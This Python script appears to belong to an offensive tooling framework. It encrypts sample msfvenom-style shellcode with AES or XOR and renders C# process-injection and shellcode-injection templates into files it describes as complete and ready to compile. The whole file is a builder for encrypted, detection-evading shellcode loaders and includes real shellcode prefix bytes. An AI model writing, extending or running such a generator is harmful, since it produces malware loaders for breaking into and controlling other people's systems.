#!/usr/bin/env python3
"""
Generate complete C# examples with real preprocessing output.
"""

import sys
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent / 'src'))

from src.core.config import ConfigManager
from src.core.preprocessor import PreprocessingOrchestrator
from src.utils.templates import TemplateRenderer
import base64


def generate_aes_example():
    """Generate complete AES injector C# code."""
    print("=" * 70)
    print("EXAMPLE 1: AES-Encrypted Process Injector (Complete C# Code)")
    print("=" * 70)
    print()
    
    # Sample shellcode (first 30 bytes of typical msfvenom output)
    test_shellcode = bytes([
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48
    ])
    
    config = ConfigManager()
    orchestrator = PreprocessingOrchestrator(config)
    
    shellcode_b64 = base64.b64encode(test_shellcode).decode('ascii')
    
    preprocessing_steps = [
        {
            'type': 'script',
            'name': 'aes_encryption',
            'script': 'aes_encrypt.py',
            'args': {
                'data': shellcode_b64,
                'key': 'auto',
                'iv': 'auto'
            },
            'output_var': 'aes_result'
        },
        {
            'type': 'script',
            'name': 'format_encrypted_payload',
            'script': 'format_csharp.py',
            'args': {
                'data': '{{ aes_result.encrypted }}',
                'var_name': 'encryptedShellcode',
                'bytes_per_line': 15
            },
            'output_var': 'csharp_shellcode'
        },
        {
            'type': 'script',
            'name': 'format_aes_key',
            'script': 'format_csharp.py',
            'args': {
                'data': '{{ aes_result.key }}',
                'var_name': 'aesKey',
                'bytes_per_line': 16
            },
            'output_var': 'csharp_key'
        },
        {
            'type': 'script',
            'name': 'format_aes_iv',
            'script': 'format_csharp.py',
            'args': {
                'data': '{{ aes_result.iv }}',
                'var_name': 'aesIV',
                'bytes_per_line': 16
            },
            'output_var': 'csharp_iv'
        }
    ]
    
    result = orchestrator.execute(preprocessing_steps, {})
    
    # Use proper template renderer instead of string replace
    renderer = TemplateRenderer(config)
    template_path = 'process_injection/aes_injector.cs'
    
    complete_code = renderer.render_template_file(template_path, result)
    
    print(complete_code)
    print()
    
    return complete_code


def generate_xor_example():
    """Generate complete XOR injector C# code."""
    print("=" * 70)
    print("EXAMPLE 2: XOR-Encoded Shellcode Injector (Complete C# Code)")
    print("=" * 70)
    print()
    
    # Sample shellcode
    test_shellcode = bytes([
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x4d, 0x31, 0xc9, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a
    ])
    
    config = ConfigManager()
    orchestrator = PreprocessingOrchestrator(config)
    
    shellcode_b64 = base64.b64encode(test_shellcode).decode('ascii')
    
    preprocessing_steps = [
        {
            'type': 'script',
            'name': 'xor_encryption',
            'script': 'xor_encrypt.py',
            'args': {
                'data': shellcode_b64,
                'key': 'fa'
            },
            'output_var': 'xor_result'
        },
        {
            'type': 'script',
            'name': 'format_payload',
            'script': 'format_csharp.py',
            'args': {
                'data': '{{ xor_result.encrypted }}',
                'var_name': 'buf',
                'bytes_per_line': 15
            },
            'output_var': 'csharp_payload'
        }
    ]
    
    result = orchestrator.execute(preprocessing_steps, {})
    
    # Use proper template renderer
    renderer = TemplateRenderer(config)
    template_path = 'shellcode_injection/xor_injector.cs'
    
    complete_code = renderer.render_template_file(template_path, result)
    
    print(complete_code)
    print()
    
    return complete_code


def save_examples():
    """Save the examples to files."""
    print("=" * 70)
    print("Saving complete examples to output/examples/")
    print("=" * 70)
    
    output_dir = Path('output/examples')
    output_dir.mkdir(parents=True, exist_ok=True)
    
    # Generate and save AES example
    print("\nGenerating AES example...")
    aes_code = generate_aes_example()
    aes_file = output_dir / 'AESInjector_Complete.cs'
    aes_file.write_text(aes_code)
    print(f"✓ Saved: {aes_file}")
    
    # Generate and save XOR example
    print("\nGenerating XOR example...")
    xor_code = generate_xor_example()
    xor_file = output_dir / 'XORInjector_Complete.cs'
    xor_file.write_text(xor_code)
    print(f"✓ Saved: {xor_file}")
    
    print("\n" + "=" * 70)
    print("Examples generated successfully!")
    print("=" * 70)
    print(f"\nFiles created:")
    print(f"  - {aes_file}")
    print(f"  - {xor_file}")
    print("\nThese are complete, compilable C# files with:")
    print("  ✓ Encrypted/encoded shellcode embedded")
    print("  ✓ Decryption/decoding logic")
    print("  ✓ Process injection code")
    print("  ✓ Ready to compile with: mcs -platform:x64 -unsafe <file>.cs")
    print()


if __name__ == "__main__":
    save_examples()
